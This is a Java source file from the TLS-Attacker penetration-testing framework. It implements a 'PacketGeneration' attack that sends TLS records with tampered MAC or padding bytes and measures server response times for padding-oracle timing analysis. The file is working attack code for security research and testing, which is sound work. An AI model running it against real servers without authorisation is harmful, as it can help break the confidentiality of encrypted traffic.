/**
 * TLS-Attacker - A Modular Penetration Testing Framework for TLS
 *
 * Copyright 2014-2016 Ruhr University Bochum / Hackmanit GmbH
 *
 * Licensed under Apache License 2.0
 * http://www.apache.org/licenses/LICENSE-2.0
 */
package de.rub.nds.tlsattacker.attacks.impl;

import de.rub.nds.tlsattacker.attacks.config.PacketGenerationCommandConfig;
import de.rub.nds.tlsattacker.tls.Attacker;
import de.rub.nds.tlsattacker.modifiablevariable.VariableModification;
import de.rub.nds.tlsattacker.modifiablevariable.bytearray.ByteArrayModificationFactory;
import de.rub.nds.tlsattacker.modifiablevariable.bytearray.ModifiableByteArray;
import de.rub.nds.tlsattacker.tls.config.ConfigHandler;
import de.rub.nds.tlsattacker.tls.constants.ConnectionEnd;
import de.rub.nds.tlsattacker.tls.exceptions.ConfigurationException;
import de.rub.nds.tlsattacker.tls.exceptions.WorkflowExecutionException;
import de.rub.nds.tlsattacker.tls.protocol.alert.AlertMessage;
import de.rub.nds.tlsattacker.tls.protocol.application.ApplicationMessage;
import de.rub.nds.tlsattacker.tls.record.Record;
import de.rub.nds.tlsattacker.tls.util.LogLevel;
import de.rub.nds.tlsattacker.tls.workflow.TlsContext;
import de.rub.nds.tlsattacker.tls.workflow.WorkflowExecutor;
import de.rub.nds.tlsattacker.tls.workflow.WorkflowTrace;
import de.rub.nds.tlsattacker.transport.TransportHandler;
import de.rub.nds.tlsattacker.util.ArrayConverter;
import java.io.FileWriter;
import java.io.IOException;
import java.util.Collections;
import java.util.HashMap;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * Executes the PacketGeneration attack test
 * 
 * @author Juraj Somorovsky (juraj.somorovsky@rub.de)
 */
public class PacketGenerationAttack extends Attacker<PacketGenerationCommandConfig> {

    private static final Logger LOGGER = LogManager.getLogger(PacketGenerationAttack.class);

    private final Map<Integer, List<Long>> results;

    private long lastResult;

    public PacketGenerationAttack(PacketGenerationCommandConfig config) {
        super(config);
        results = new HashMap<>();
    }

    @Override
    public void executeAttack(ConfigHandler configHandler) {
        String[] paddingStrings = config.getPaddings().split(",");
        int[] paddings = new int[paddingStrings.length];
        for (int i = 0; i < paddingStrings.length; i++) {
            paddings[i] = Integer.parseInt(paddingStrings[i]);
        }
        int error = config.getErrorType();
        int correct = config.getPaddingCorrect();
        for (int i = 0; i < config.getMeasurements(); i++) {
            LOGGER.log(LogLevel.CONSOLE_OUTPUT, "Starting round {}", i);
            for (int p : paddings) {
                Record record = createRecordWithErrorData(error, correct);
                // Record record = createRecordWithPadding(p, correct);
                record.setMeasuringTiming(true);
                executeAttackRound(configHandler, record);
                if (results.get(p) == null) {
                    results.put(p, new LinkedList<Long>());
                }
                // remove the first 20% of measurements
                if (i > config.getMeasurements() / 5) {
                    results.get(p).add(lastResult);
                }
            }
        }

        StringBuilder medians = new StringBuilder();
        for (int padding : paddings) {
            List<Long> rp = results.get(padding);
            Collections.sort(rp);
            LOGGER.log(LogLevel.CONSOLE_OUTPUT, "Padding: {}", padding);
            long median = rp.get(rp.size() / 2);
            LOGGER.log(LogLevel.CONSOLE_OUTPUT, "Median: {}", median);
            medians.append(median).append(",");
        }
        LOGGER.log(LogLevel.CONSOLE_OUTPUT, "Medians: {}", medians);

        if (config.getMonaFile() != null) {
            StringBuilder commands = new StringBuilder();
            for (int i = 0; i < paddings.length - 1; i++) {
                for (int j = i + 1; j < paddings.length; j++) {
                    String fileName = config.getMonaFile() + "-" + paddings[i] + "-" + paddings[j];
                    String[] delimiters = { (";" + paddings[i] + ";"), (";" + paddings[j] + ";") };
                    createMonaFile(fileName, delimiters, results.get(paddings[i]), results.get(paddings[j]));
                    String command = "java -jar ReportingTool.jar --inputFile=" + fileName + " --name=packetgeneration-"
                            + paddings[i] + "-" + paddings[j] + " --lowerBound=0.3 --upperBound=0.5";
                    LOGGER.log(LogLevel.CONSOLE_OUTPUT, "Run mona timing lib with: " + command);
                    commands.append(command);
                    commands.append(System.getProperty("line.separator"));
                }
            }
            LOGGER.log(LogLevel.CONSOLE_OUTPUT, "All commands at once: \n{}", commands);
        }
    }

    private void createMonaFile(String fileName, String[] delimiters, List<Long> result1, List<Long> result2) {
        try (FileWriter fw = new FileWriter(fileName)) {
            for (int i = 0; i < result1.size(); i++) {
                fw.write(Integer.toString(i * 2));
                fw.write(delimiters[0] + result1.get(i) + System.getProperty("line.separator"));
                fw.write(Integer.toString(i * 2 + 1));
                fw.write(delimiters[1] + result2.get(i) + System.getProperty("line.separator"));
            }
        } catch (IOException ex) {
            LOGGER.error(ex);
        }
    }

    // public void closeConnectionAndServer(TransportHandler transportHandler) {
    //     transportHandler.sendData("Q");
    // }

    public void executeAttackRound(ConfigHandler configHandler, Record record) {
        TransportHandler transportHandler = configHandler.initializeTransportHandler(config);
        TlsContext tlsContext = configHandler.initializeTlsContext(config);
        WorkflowExecutor workflowExecutor = configHandler.initializeWorkflowExecutor(transportHandler, tlsContext);

        WorkflowTrace trace = tlsContext.getWorkflowTrace();

        ApplicationMessage applicationMessage = new ApplicationMessage(ConnectionEnd.CLIENT);
        applicationMessage.addRecord(record);

        AlertMessage allertMessage = new AlertMessage(ConnectionEnd.SERVER);

        trace.getProtocolMessages().add(applicationMessage);
        trace.getProtocolMessages().add(allertMessage);

        try {
            workflowExecutor.executeWorkflow();
        } catch (WorkflowExecutionException ex) {
            LOGGER.info("Not possible to finalize the defined workflow: {}", ex.getLocalizedMessage());
        }
        tlsContexts.add(tlsContext);
        lastResult = transportHandler.getLastMeasurement();

        transportHandler.closeConnection();
        // closeConnectionAndServer(transportHandler);
    }

    private Record createRecordWithErrorData(int errorType, int paddingError) {
        Record r = new Record();
        // ModifiableInteger paddingLength = new ModifiableInteger();

        if (errorType == 0) { // No error
            return r;
        }
        else if (errorType == 1) { // MAC error
            ModifiableByteArray mac = new ModifiableByteArray();
            VariableModification<byte[]> modifier = ByteArrayModificationFactory.xor(new byte[] { 1 }, -1);
            mac.setModification(modifier);
            r.setMac(mac);
        }
        else if (errorType == 2) { // padding error
            ModifiableByteArray padding = new ModifiableByteArray();
            VariableModification<byte[]> modifier = ByteArrayModificationFactory.xor(new byte[] { 1 }, -1);
            padding.setModification(modifier);
            r.setPadding(padding);
        }
        else if (errorType == 3) { // set last byte to -paddingerror
            ModifiableByteArray padding = new ModifiableByteArray();
            VariableModification<byte[]> modifier = ByteArrayModificationFactory.delete(-1, 1);
            VariableModification<byte[]> modifier2 = ByteArrayModificationFactory.insert(new byte[] { (byte) paddingError }, -1);
            modifier2.setPostModification(modifier);
            padding.setModification(modifier2);
            r.setPadding(padding);
        }
        else if (errorType == 4) { // padding error in second last byte
            ModifiableByteArray padding = new ModifiableByteArray();
            VariableModification<byte[]> modifier = ByteArrayModificationFactory.xor(new byte[] { 1 }, -2);
            padding.setModification(modifier);
            r.setPadding(padding);
        }
        else if (errorType == 5) { // set second last byte to -paddingerror
            ModifiableByteArray padding = new ModifiableByteArray();
            VariableModification<byte[]> modifier = ByteArrayModificationFactory.delete(-1, 1);
            VariableModification<byte[]> modifier2 = ByteArrayModificationFactory.insert(new byte[] { (byte) paddingError }, -1);
            modifier.setPostModification(modifier2);
            padding.setModification(modifier);
            r.setPadding(padding);
        }
        return r;
    }

    private Record createRecordWithPadding(int p, int correct) {
        byte[] padding = createPaddingBytes(p);
        // XOR last padding byte with $correct
        padding[padding.length-1] = (byte) correct;
        int recordLength = config.getBlockSize() * config.getBlocks();
        if (recordLength < padding.length) {
            throw new ConfigurationException("Padding too large");
        }
        int messageSize = recordLength - padding.length;
        byte[] message = new byte[messageSize];
        byte[] plain = ArrayConverter.concatenate(message, padding);
        return createRecordWithPlainData(plain);
    }

    private Record createRecordWithPlainData(byte[] plain) {
        Record r = new Record();
        ModifiableByteArray plainData = new ModifiableByteArray();
        VariableModification<byte[]> modifier = ByteArrayModificationFactory.explicitValue(plain);
        plainData.setModification(modifier);
        r.setPlainRecordBytes(plainData);
        return r;
    }

    private byte[] createPaddingBytes(int padding) {
        byte[] paddingBytes = new byte[padding + 1];
        for (int i = 0; i < paddingBytes.length; i++) {
            paddingBytes[i] = (byte) padding;
        }
        return paddingBytes;
    }

}
